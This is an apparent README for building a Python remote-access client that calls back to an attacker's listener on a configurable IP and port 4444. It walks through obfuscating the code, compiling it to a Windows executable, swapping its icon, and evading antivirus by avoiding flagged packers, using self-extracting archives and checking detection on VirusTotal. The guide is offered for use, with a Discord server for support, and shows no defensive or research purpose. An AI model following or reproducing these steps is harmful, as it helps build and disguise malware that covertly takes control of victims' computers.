<b>Installation :<b/>

1) You need to install Python 3.12<br>

2) In cmd run :
```ruby
pip install -r requirements.txt
```
3) Go into ./General-Users/Python-Files/ then edit Client.py :
```ruby
SERVER_HOST = '127.0.0.1' --> Put the Server-Listener IP
SERVER_PORT = 4444 --> Put the Server-Listener PORT
```

   -Code minifier (1)<br>
   -Var Obfusc (2)<br>

7) In the Tools folder you'll found the builder bat file, follow the instructions and the exe will be in the build folder.<br>

8) To change the exe icon or whatever, i've put you the RessourceHacker latest installer ( 18/06/2024 )

/!\ WARNING /!\ I use cx_freeze to compile the exe bcs pyinstaller is flagged by microsoft so you need all the Folder with the exe into it to run it<br>
DISCLAIMER : I recommend you to use an sfx archive, try different method and test it on VirusTotal, for me it haven't work with winrar.<br>
For any question go in the discord server.<br>
